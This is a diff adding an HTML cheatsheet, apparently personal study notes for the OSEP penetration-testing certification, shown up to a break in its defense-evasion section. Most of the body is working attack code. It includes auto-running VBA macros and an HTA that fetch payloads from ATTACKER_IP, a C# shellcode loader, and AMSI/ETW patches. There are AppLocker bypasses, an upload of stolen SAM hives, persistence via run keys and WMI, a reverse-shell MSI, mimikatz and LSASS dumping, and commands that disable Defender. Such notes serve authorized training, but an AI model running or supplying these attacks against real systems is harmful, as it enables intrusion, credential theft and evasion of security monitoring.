@@ -1,0 +1,2551 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>OSEP | Notes v2</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="./img/osep_icon.png" rel="icon">
+  <link href="./img/osep_icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link
+    href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i"
+    rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="./vendor/aos/aos.css" rel="stylesheet">
+  <link href="./vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="./vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <!-- Prism CSS -->
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+
+  <!-- Template Main CSS File -->
+  <link href="./css/style.css" rel="stylesheet">
+
+  <!-- Open Graph meta tags -->
+  <meta property="og:title" content="OSEP Notes v2">
+  <meta property="og:description" content="A concise OSEP cheatsheet covering evasion, Active Directory, and advanced penetration testing.">
+  <meta property="og:image" content="./img/favicon.png">
+  <meta property="og:url" content="./osep_new.html">
+  <meta property="og:type" content="website">
+
+  <!-- Twitter Card meta tags -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="OSEP Notes v2">
+  <meta name="twitter:description" content="A concise OSEP cheatsheet covering evasion, Active Directory, and advanced penetration testing.">
+  <meta name="twitter:image" content="./img/favicon.png">
+  <style>
+  /* Index sidebar color flow (bell curve, green hue) — 10 sections */
+  .section-flow-1{background-color:#f3f7f4;}
+  .section-flow-1 .dropdown-container{background-color:#f3f7f4;}
+  .section-flow-2{background-color:#d0eadb;}
+  .section-flow-2 .dropdown-container{background-color:#d0eadb;}
+  .section-flow-3{background-color:#8ed4a8;}
+  .section-flow-3 .dropdown-container{background-color:#8ed4a8;}
+  .section-flow-4{background-color:#4fc87a;}
+  .section-flow-4 .dropdown-container{background-color:#4fc87a;}
+  .section-flow-5{background-color:#25b360;}
+  .section-flow-5 .dropdown-container{background-color:#25b360;}
+  .section-flow-6{background-color:#1ea657;}
+  .section-flow-6 .dropdown-container{background-color:#1ea657;}
+  .section-flow-7{background-color:#25b360;}
+  .section-flow-7 .dropdown-container{background-color:#25b360;}
+  .section-flow-8{background-color:#4fc87a;}
+  .section-flow-8 .dropdown-container{background-color:#4fc87a;}
+  .section-flow-9{background-color:#8ed4a8;}
+  .section-flow-9 .dropdown-container{background-color:#8ed4a8;}
+  .section-flow-10{background-color:#d0eadb;}
+  .section-flow-10 .dropdown-container{background-color:#d0eadb;}
+  </style>
+</head>
+
+<body>
+
+  <!-- ======= Mobile nav toggle button ======= -->
+  <button type="button" class="menu-trigger" onclick="toggleMenu()" aria-label="Toggle menu" aria-expanded="false"><i class="bi bi-list"></i><i class="bi bi-x-lg"></i></button>
+  <div class="menu-backdrop" onclick="closeMenu()" aria-hidden="true"></div>
+
+  <!-- ======= Header ======= -->
+  <!-- ======= Top Bar (brand strip; always visible) ======= -->
+  <div id="topbar">
+    <div class="topbar-social">
+      <a href="https://www.linkedin.com/in/wencheng-xue5aa52631b/" target="_blank" rel="noopener noreferrer" class="linkedin" aria-label="LinkedIn"><i class="bi bi-linkedin"></i></a>
+      <div class="topbar-email-wrap">
+        <button type="button" class="topbar-email" onclick="toggleTopbarEmail(event)" aria-label="Email" aria-haspopup="dialog" aria-expanded="false"><i class="bi bi-envelope-fill"></i></button>
+        <div id="topbar-email-popup" class="topbar-email-popup" role="dialog" aria-label="Contact email">
+          <span class="topbar-email-text">xuewencheng156@gmail.com</span>
+          <button type="button" class="topbar-email-copy" onclick="copyTopbarEmail(event)" title="Copy"><i class="bi bi-clipboard"></i></button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <header id="header">
+    <div class="d-flex flex-column">
+
+      <div class="profile">
+        <h1 class="text-light"><a href="index.html">Wencheng Xue</a></h1>
+        <div class="social-links mt-3 text-center">
+          <a href="https://www.linkedin.com/in/wencheng-xue5aa52631b/" target="_blank" class="linkedin"><i class="bi bi-linkedin"></i></a>
+          <div class="sidebar-email-wrap">
+            <button type="button" class="sidebar-email" onclick="toggleSidebarEmail(event)" aria-label="Email" aria-haspopup="dialog" aria-expanded="false"><i class="bi bi-envelope-fill"></i></button>
+            <div id="sidebar-email-popup" class="sidebar-email-popup" role="dialog" aria-label="Contact email">
+              <span class="sidebar-email-text">xuewencheng156@gmail.com</span>
+              <button type="button" class="sidebar-email-copy" onclick="copySidebarEmail(event)" title="Copy"><i class="bi bi-clipboard"></i></button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <nav id="navbar" class="nav-menu navbar">
+        <ul>
+          <li><a href="./index.html" class="nav-link scrollto"><i class="bi bi-house navicon"></i>Home</a></li>
+          <li class="dropdown">
+            <a href="./oscp.html" class="nav-link scrollto" onclick="toggleSubmenu(event)"><i
+                class="bi bi-laptop navicon"></i>Notes <span class="arrow"><i class="bi bi-caret-right-fill"></i></span></a>
+            <ul id="submenu" class="submenu">
+              <li><a href="./oscp.html" class="nav-link scrollto"><img src="./img/oscp_icon.png" alt="OSCP Icon" class="nav-icon-img">OSCP</a></li>
+              <li><a href="./osep.html" class="nav-link scrollto"><img src="./img/osep_icon.png" alt="OSEP Icon" class="nav-icon-img">OSEP</a></li>
+              <li><a href="./oswe.html" class="nav-link scrollto"><img src="./img/oswe_icon.svg" alt="OSWE Icon" class="nav-icon-img">OSWE</a></li>
+              <li><a href="./osed.html" class="nav-link scrollto"><img src="./img/osed_icon.svg" alt="OSED Icon" class="nav-icon-img">OSED</a></li>
+              <li><a href="#" class="nav-link scrollto nav-disabled" onclick="return false;"><img src="./img/osai_icon.svg" alt="OSAI Icon" class="nav-icon-img">OSAI <span class="coming-soon-badge">Coming Soon</span></a></li>
+              <li><a href="./crto.html" class="nav-link scrollto"><img src="./img/crto_icon.png" alt="CRTO Icon" class="nav-icon-img">CRTO</a></li>
+              <li><a href="./crtl.html" class="nav-link scrollto"><img src="./img/crtl_icon.png" alt="CRTL Icon" class="nav-icon-img">CRTL</a></li>
+            </ul>
+          </li>
+          <li class="dropdown">
+            <a href="./oscp_new.html" class="nav-link scrollto active" onclick="toggleSubmenu(event)"><i
+                class="bi bi-journal-text navicon"></i>Notesv2 <span class="arrow"><i class="bi bi-caret-right-fill"></i></span></a>
+            <ul id="submenu2" class="submenu open">
+              <li><a href="./oscp_new.html" class="nav-link scrollto"><img src="./img/oscp_icon.png" alt="OSCP Icon" class="nav-icon-img">OSCP</a></li>
+              <li><a href="./osep_new.html" class="nav-link scrollto active"><img src="./img/osep_icon.png" alt="OSEP Icon" class="nav-icon-img">OSEP</a></li>
+              <li><a href="./oswe_new.html" class="nav-link scrollto"><img src="./img/oswe_icon.svg" alt="OSWE Icon" class="nav-icon-img">OSWE</a></li>
+              <li><a href="./osed_new.html" class="nav-link scrollto"><img src="./img/osed_icon.svg" alt="OSED Icon" class="nav-icon-img">OSED</a></li>
+            </ul>
+          </li>
+          <li><a href="./portfolio.html" class="nav-link scrollto"><i class="bi bi-folder-fill navicon"></i><span>Portfolio</span></a></li>
+          <li class="dropdown">
+            <a href="./projects.html" class="nav-link scrollto" onclick="toggleSubmenu(event)"><i
+                class="bi bi-code-square navicon"></i>Projects <span class="arrow"><i class="bi bi-caret-right-fill"></i></span></a>
+            <ul class="submenu">
+              <li><a href="./sliver-c2-evasion-suite.html" class="nav-link scrollto"><i class="bi bi-shield-shaded" style="font-size: 18px; vertical-align: middle; margin-right: 6px; color: #6f42c1;"></i>Sliver C2 Evasion Suite</a></li>
+            </ul>
+          </li>
+        </ul>
+      </nav><!-- .nav-menu -->
+    </div>
+  </header><!-- End Header -->
+
+  <main id="main">
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+
+        <div class="d-flex justify-content-between align-items-center">
+          <h2>OSEP Notes v2</h2>
+          <p class="text-muted small">Latest update: June, 2026</p>
+          <ol>
+            <li><a href="index.html">Home</a></li>
+            <li>OSEP Notes v2</li>
+          </ol>
+        </div>
+
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= Cheatsheet Section ======= -->
+    <section id="cheatsheet" class="cheatsheet">
+      <div class="container">
+
+        <div class="row gy-4">
+          <div class="col-lg-12">
+
+
+<!-- ============================================================ -->
+<!--  1. RECONNAISSANCE                                           -->
+<!-- ============================================================ -->
+<h2 id="reconnaissance">1. Reconnaissance</h2>
+<p>Scanning from outside and inside the network to map targets, services, and attack surface.</p>
+
+<h3 id="recon-external-nmap">1.1 External Scanning &mdash; Nmap</h3>
+
+<pre><code class="language-bash"># Fast TCP scan — top 1000 ports
+nmap -sC -sV -oN nmap_initial.txt TARGET_IP
+
+# Full TCP port scan
+nmap -p- --min-rate 10000 -oN nmap_allports.txt TARGET_IP
+
+# Targeted scan on discovered ports
+nmap -sC -sV -p 80,135,139,445,1433,3389,5985 -oN nmap_targeted.txt TARGET_IP
+
+# UDP top 20
+sudo nmap -sU --top-ports 20 -oN nmap_udp.txt TARGET_IP
+</code></pre>
+
+<h3 id="recon-external-rustscan">1.2 External Scanning &mdash; RustScan</h3>
+
+<pre><code class="language-bash"># Quick full-port sweep, hand off to nmap
+rustscan -a TARGET_IP --ulimit 5000 -- -sC -sV -oN rustscan_out.txt
+
+# Scan multiple hosts
+rustscan -a 10.10.10.1,10.10.10.2,10.10.10.3 --ulimit 5000
+</code></pre>
+
+<h3 id="recon-internal-scanning">1.3 Internal Scanning from Foothold</h3>
+<p>When on a compromised host without nmap, use living-off-the-land techniques.</p>
+
+<pre><code class="language-powershell"># PowerShell port scanner — quick sweep
+1..254 | ForEach-Object { Test-NetConnection -ComputerName "10.10.10.$_" -Port 445 -WarningAction SilentlyContinue |
+  Where-Object { $_.TcpTestSucceeded } |
+  Select-Object ComputerName, RemotePort }
+
+# Scan common ports on a single host
+@(21,22,80,135,139,443,445,1433,3306,3389,5985) | ForEach-Object {
+  $r = Test-NetConnection -ComputerName TARGET -Port $_ -WarningAction SilentlyContinue
+  if ($r.TcpTestSucceeded) { "Port $_ open" }
+}
+</code></pre>
+
+<pre><code class="language-bash"># Bash one-liner sweep from Linux foothold
+for i in $(seq 1 254); do (ping -c 1 -W 1 10.10.10.$i | grep "bytes from" &amp;); done
+
+# Bash port scan without nmap
+for port in 21 22 80 135 445 1433 3389 5985; do
+  (echo &gt; /dev/tcp/TARGET/$port) 2&gt;/dev/null &amp;&amp; echo "Port $port open"
+done
+</code></pre>
+
+<h3 id="recon-service-enum">1.4 Service Enumeration</h3>
+
+<pre><code class="language-bash"># SMB enumeration
+crackmapexec smb TARGET_IP -u '' -p '' --shares
+smbclient -N -L //TARGET_IP
+enum4linux -a TARGET_IP
+
+# LDAP enumeration
+ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" "(objectClass=*)" | head -50
+
+# SNMP
+snmpwalk -v2c -c public TARGET_IP
+
+# DNS zone transfer
+dig axfr @DC_IP corp.local
+</code></pre>
+
+
+<h3 id="recon-web-enum">1.5 Web Enumeration</h3>
+
+<pre><code class="language-bash"># Directory brute force
+gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster.txt
+feroxbuster -u http://TARGET_IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o ferox.txt
+
+# Subdomain enumeration
+gobuster dns -d corp.local -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.corp.local" -u http://TARGET_IP --hc 404
+
+# Vulnerability scanning
+nikto -h http://TARGET_IP -o nikto.txt
+</code></pre>
+
+
+<!-- ============================================================ -->
+<!--  2. INITIAL ACCESS                                           -->
+<!-- ============================================================ -->
+<h2 id="initial-access">2. Initial Access</h2>
+<p>Gaining a foothold through phishing payloads, shellcode loaders, and defense evasion.</p>
+
+<h3 id="ia-vba-macros">2.1 VBA Macros</h3>
+
+<pre><code class="language-visual-basic">' Basic macro to run a PowerShell download cradle
+Sub AutoOpen()
+    Dim cmd As String
+    cmd = "powershell -ep bypass -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"""
+    Shell cmd, vbHide
+End Sub
+
+Sub Document_Open()
+    AutoOpen
+End Sub
+</code></pre>
+
+<pre><code class="language-visual-basic">' Macro with WMI process creation (avoids cmd.exe as child of WINWORD)
+Sub AutoOpen()
+    Dim objWMI As Object
+    Dim objProc As Object
+    Set objWMI = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
+    objWMI.Create "powershell -ep bypass -w hidden -enc ENCODED_PAYLOAD", Null, Null, objProc
+End Sub
+</code></pre>
+
+<h3 id="ia-hta">2.2 HTA Files</h3>
+
+<pre><code class="language-markup">&lt;!-- Basic HTA payload --&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;HTA:APPLICATION ID="payload" APPLICATIONNAME="Update" SCROLL="no" SINGLEINSTANCE="yes"&gt;
+&lt;script language="VBScript"&gt;
+Sub Window_OnLoad
+  Set objShell = CreateObject("WScript.Shell")
+  objShell.Run "powershell -ep bypass -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')""", 0
+  Window.Close
+End Sub
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<h3 id="ia-iso">2.3 ISO Containers</h3>
+<p>ISO files bypass Mark-of-the-Web (MOTW) since Windows auto-mounts them as a drive.</p>
+
+<pre><code class="language-bash"># Create an ISO with a LNK + DLL payload
+# Place malicious DLL and a .lnk that loads it inside a folder
+mkisofs -o payload.iso -J -r ./iso_contents/
+
+# PowerShell: create ISO from folder
+$src = "C:\Payload\iso_contents"
+$dest = "C:\Payload\delivery.iso"
+$fsi = New-Object -ComObject IMAPI2FS.MsftFileSystemImage
+$fsi.FileSystemsToCreate = 2  # ISO9660 + Joliet
+$fsi.VolumeName = "Update"
+$item = $fsi.Root
+$item.AddTree($src, $false)
+$result = $fsi.CreateResultImage()
+$stream = $result.ImageStream
+# Write stream to file...
+</code></pre>
+
+<h3 id="ia-shellcode-loader">2.4 Shellcode Loader &mdash; C# XOR Decrypt</h3>
+<p>Standard loader pattern: decrypt shellcode with XOR, allocate RW memory, copy, change to RX, execute.</p>
+
+<pre><code class="language-csharp">using System;
+using System.Runtime.InteropServices;
+
+namespace ShellcodeLoader
+{
+    class Program
+    {
+        // P/Invoke declarations
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+            uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
+            uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
+            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        // XOR decryption
+        static byte[] XorDecrypt(byte[] data, byte[] key)
+        {
+            byte[] result = new byte[data.Length];
+            for (int i = 0; i &lt; data.Length; i++)
+            {
+                result[i] = (byte)(data[i] ^ key[i % key.Length]);
+            }
+            return result;
+        }
+
+        static void Main(string[] args)
+        {
+            // XOR-encrypted shellcode (replace with your own)
+            byte[] encBuf = new byte[] { 0xfc, 0x48, 0x83, /* ... */ };
+            byte[] key = new byte[] { 0x41, 0x42, 0x43, 0x44 };
+
+            // Decrypt
+            byte[] shellcode = XorDecrypt(encBuf, key);
+
+            // Allocate RW memory
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
+                0x3000 /* MEM_COMMIT | MEM_RESERVE */, 0x04 /* PAGE_READWRITE */);
+
+            // Copy shellcode
+            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
+
+            // Change to RX
+            uint oldProtect;
+            VirtualProtect(addr, (uint)shellcode.Length,
+                0x20 /* PAGE_EXECUTE_READ */, out oldProtect);
+
+            // Execute
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
+                IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
+    }
+}
+</code></pre>
+
+<h3 id="ia-amsi-etw">2.5 AMSI &amp; ETW Bypass</h3>
+
+<pre><code class="language-powershell"># AMSI bypass — patch AmsiScanBuffer in memory
+$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$f = $a.GetField('amsiInitFailed','NonPublic,Static')
+$f.SetValue($null,$true)
+</code></pre>
+
+<pre><code class="language-powershell"># Alternative AMSI bypass — reflection-based patching
+[Runtime.InteropServices.Marshal]::WriteByte(
+  ([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField(
+    'amsiContext','NonPublic,Static').GetValue($null)),
+  0x04, 0x14
+)
+</code></pre>
+
+<pre><code class="language-powershell"># ETW bypass — patch EtwEventWrite
+$etw = [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType(
+  'System.Diagnostics.Eventing.EventProvider')
+$etwField = $etw.GetField('m_enabled','NonPublic,Instance')
+# Alternatively, patch ntdll!EtwEventWrite return
+</code></pre>
+
+<pre><code class="language-csharp">// C# ETW patch — overwrite EtwEventWrite with ret
+[DllImport("kernel32")]
+static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+[DllImport("kernel32")]
+static extern IntPtr LoadLibrary(string name);
+
+[DllImport("kernel32")]
+static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
+    uint flNewProtect, out uint lpflOldProtect);
+
+static void PatchEtw()
+{
+    IntPtr ntdll = LoadLibrary("ntdll.dll");
+    IntPtr etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
+    uint oldProtect;
+    VirtualProtect(etwAddr, (UIntPtr)1, 0x40, out oldProtect);
+    Marshal.WriteByte(etwAddr, 0xc3); // ret
+    VirtualProtect(etwAddr, (UIntPtr)1, oldProtect, out oldProtect);
+}
+</code></pre>
+
+<h3 id="ia-clm-bypass">2.6 Constrained Language Mode Bypass</h3>
+
+<pre><code class="language-powershell"># Check current language mode
+$ExecutionContext.SessionState.LanguageMode
+
+# PowerShell downgrade to v2 (if available — bypasses CLM)
+powershell -version 2 -ep bypass
+
+# Use MSBuild to execute C# outside PowerShell CLM
+# Create payload.xml with inline C# task, then:
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
+
+# InstallUtil bypass
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
+
+# Use runscripthelper.exe (LOLBIN)
+# Place script at expected path and trigger
+</code></pre>
+
+<h3 id="ia-applocker-bypass">2.7 AppLocker Bypass</h3>
+
+<pre><code class="language-powershell"># Common writable directories allowed by default AppLocker rules
+C:\Windows\Tasks\
+C:\Windows\Temp\
+C:\Windows\tracing\
+C:\Windows\Registration\CRMLog\
+C:\Windows\System32\FxsTmp\
+C:\Windows\System32\com\dmp\
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys\
+C:\Windows\System32\spool\drivers\color\
+C:\Windows\System32\spool\PRINTERS\
+C:\Windows\System32\spool\SERVERS\
+C:\Windows\SysWOW64\FxsTmp\
+C:\Windows\SysWOW64\com\dmp\
+C:\Windows\SysWOW64\Tasks\
+
+# Verify writable
+icacls "C:\Windows\Tasks"
+
+# Copy payload and execute from allowed path
+copy payload.exe C:\Windows\Tasks\payload.exe
+C:\Windows\Tasks\payload.exe
+
+# LOLBIN execution — use trusted binaries
+# MSBuild
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Windows\Tasks\payload.xml
+
+# Rundll32
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -w hidden -c IEX(...)")
+</code></pre>
+
+<h3 id="ia-powershell-cradles">2.8 PowerShell Cradles</h3>
+
+<pre><code class="language-powershell"># Basic download cradle
+IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')
+
+# WebRequest cradle
+IEX(Invoke-WebRequest -Uri 'http://ATTACKER_IP/payload.ps1' -UseBasicParsing).Content
+
+# .NET WebClient with proxy-aware settings
+$wc = New-Object System.Net.WebClient
+$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
+$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+IEX($wc.DownloadString('http://ATTACKER_IP/payload.ps1'))
+
+# Base64 encoded command
+powershell -ep bypass -w hidden -enc BASE64_ENCODED_COMMAND
+
+# Encode a command
+$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"
+[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+</code></pre>
+
+
+<!-- ============================================================ -->
+<!--  3. POST-EXPLOITATION: WINDOWS                               -->
+<!-- ============================================================ -->
+<h2 id="post-windows">3. Post-Exploitation: Windows</h2>
+<p>Situational awareness, persistence, and privilege escalation on Windows targets.</p>
+
+<h3 id="pw-situational-awareness">3.1 Situational Awareness</h3>
+
+<pre><code class="language-powershell"># System info
+systeminfo
+hostname
+whoami /all
+whoami /priv
+
+# Network
+ipconfig /all
+route print
+netstat -ano
+arp -a
+
+# Users and groups
+net user
+net localgroup
+net localgroup Administrators
+qwinsta
+
+# Domain context
+net user /domain
+net group /domain
+net group "Domain Admins" /domain
+nltest /dclist:corp.local
+
+# Running processes
+Get-Process | Select-Object Id, ProcessName, Path | Format-Table -AutoSize
+tasklist /v
+
+# Installed software
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" |
+  Select-Object DisplayName, DisplayVersion, Publisher | Format-Table -AutoSize
+</code></pre>
+
+<h3 id="pw-file-operations">3.2 File Operations</h3>
+
+<pre><code class="language-powershell"># Search for sensitive files
+Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.ini,*.cfg,*.config,*.xml,*.bak -ErrorAction SilentlyContinue |
+  Select-String -Pattern "password|credential|secret" -List
+
+# Find files modified in last 7 days
+Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue |
+  Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } |
+  Select-Object FullName, LastWriteTime
+
+# Download file
+Invoke-WebRequest -Uri "http://ATTACKER_IP/tool.exe" -OutFile "C:\Windows\Temp\tool.exe"
+certutil -urlcache -f http://ATTACKER_IP/tool.exe C:\Windows\Temp\tool.exe
+
+# Upload file (PowerShell)
+$bytes = [IO.File]::ReadAllBytes("C:\loot\sam.hiv")
+Invoke-WebRequest -Uri "http://ATTACKER_IP:8080/upload" -Method POST -Body $bytes
+</code></pre>
+
+<h3 id="pw-av-enum">3.3 AV &amp; EDR Enumeration</h3>
+
+<pre><code class="language-powershell"># Check Windows Defender status
+Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, AMServiceEnabled
+
+# List AV products via WMI
+Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct |
+  Select-Object displayName, productState
+
+# Check if specific EDR processes are running
+$edr = @("MsSense","SenseIR","SenseNdr","MsMpEng","windefend","CSFalconService",
+  "CylanceSvc","cb","CarbonBlack","SentinelAgent","SentinelOne")
+Get-Process | Where-Object { $edr -contains $_.ProcessName } |
+  Select-Object ProcessName, Id
+
+# AppLocker policy check
+Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
+
+# Constrained Language Mode check
+$ExecutionContext.SessionState.LanguageMode
+
+# Check Defender exclusions
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+</code></pre>
+
+<h3 id="pw-persistence">3.4 Persistence</h3>
+
+<pre><code class="language-powershell"># Registry Run key
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
+
+# Registry RunOnce (survives one reboot)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Updater /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
+
+# Scheduled task
+schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" /sc onlogon /ru SYSTEM /f
+
+# PowerShell scheduled task
+$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\payload.exe"
+$trigger = New-ScheduledTaskTrigger -AtLogon
+Register-ScheduledTask -TaskName "SystemHealth" -Action $action -Trigger $trigger -RunLevel Highest -Force
+
+# Service-based persistence (requires admin)
+sc.exe create "WindowsHealthSvc" binPath= "C:\Windows\Temp\payload.exe" start= auto
+sc.exe start WindowsHealthSvc
+
+# WMI event subscription (requires admin)
+$filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
+  Name = "CoreFilter"
+  EventNameSpace = "root\cimv2"
+  QueryLanguage = "WQL"
+  Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+}
+$consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{
+  Name = "CoreConsumer"
+  CommandLineTemplate = "C:\Windows\Temp\payload.exe"
+}
+Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
+  Filter = $filter
+  Consumer = $consumer
+}
+</code></pre>
+
+<h3 id="pw-privesc">3.5 Privilege Escalation</h3>
+
+<pre><code class="language-powershell"># Check for SeImpersonatePrivilege (potato attacks)
+whoami /priv
+
+# Unquoted service paths
+Get-CimInstance -ClassName Win32_Service | Where-Object {
+  $_.PathName -notmatch '^"' -and $_.PathName -match '\s'
+} | Select-Object Name, PathName, StartMode
+
+# Weak service permissions
+# Use accesschk from Sysinternals
+accesschk.exe /accepteula -uwcqv "Everyone" *
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+
+# Service binary hijacking
+sc.exe qc vulnerable_service
+# If binary path is writable, replace it
+copy C:\Windows\Temp\payload.exe "C:\Program Files\VulnApp\service.exe"
+sc.exe stop vulnerable_service
+sc.exe start vulnerable_service
+
+# AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+# If both return 1, create MSI payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f msi -o evil.msi
+msiexec /quiet /qn /i evil.msi
+
+# PrintSpoofer (SeImpersonatePrivilege)
+PrintSpoofer64.exe -c "C:\Windows\Temp\payload.exe"
+
+# GodPotato
+GodPotato.exe -cmd "C:\Windows\Temp\payload.exe"
+</code></pre>
+
+<pre><code class="language-bash"># Credential harvesting
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
+mimikatz.exe "privilege::debug" "lsadump::dcsync /user:corp\krbtgt" "exit"
+
+# Dump SAM/SYSTEM hives
+reg save HKLM\SAM C:\Windows\Temp\sam.hiv
+reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
+reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
+
+# Extract offline
+impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL
+</code></pre>
+
+<h3 id="pw-credential-access">3.6 Credential Access</h3>
+
+<pre><code class="language-powershell"># DPAPI — decrypt saved credentials
+mimikatz.exe "dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\CREDENTIAL_FILE" "exit"
+
+# Chrome saved passwords (requires user context)
+# SharpChrome
+.\SharpChrome.exe logins
+
+# Vault credentials
+vaultcmd /list
+vaultcmd /listcreds:"Windows Credentials" /all
+
+# WiFi passwords
+netsh wlan show profile
+netsh wlan show profile name="SSID" key=clear
+
+# Search for passwords in files
+findstr /si "password" *.txt *.ini *.cfg *.config *.xml
+findstr /si "connectionstring" *.config *.xml
+
+# PowerShell history
+Get-Content (Get-PSReadlineOption).HistorySavePath
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# Credential Manager
+cmdkey /list
+# If stored creds exist, use runas:
+runas /savecred /user:corp\admin "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
+
+# LSASS dump with comsvcs.dll (no mimikatz needed)
+tasklist | findstr lsass
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump PID C:\Windows\Temp\lsass.dmp full
+# Transfer and parse offline with pypykatz
+pypykatz lsa minidump lsass.dmp
+</code></pre>
+
+<h3 id="pw-defense-evasion">3.7 Defense Evasion</h3>
+
+<pre><code class="language-powershell"># Disable Windows Defender (requires admin)
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableIntrusionPreventionSystem $true
+
+# Add exclusion paths
+Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+Add-MpPreference -ExclusionProcess "payload.exe"
+
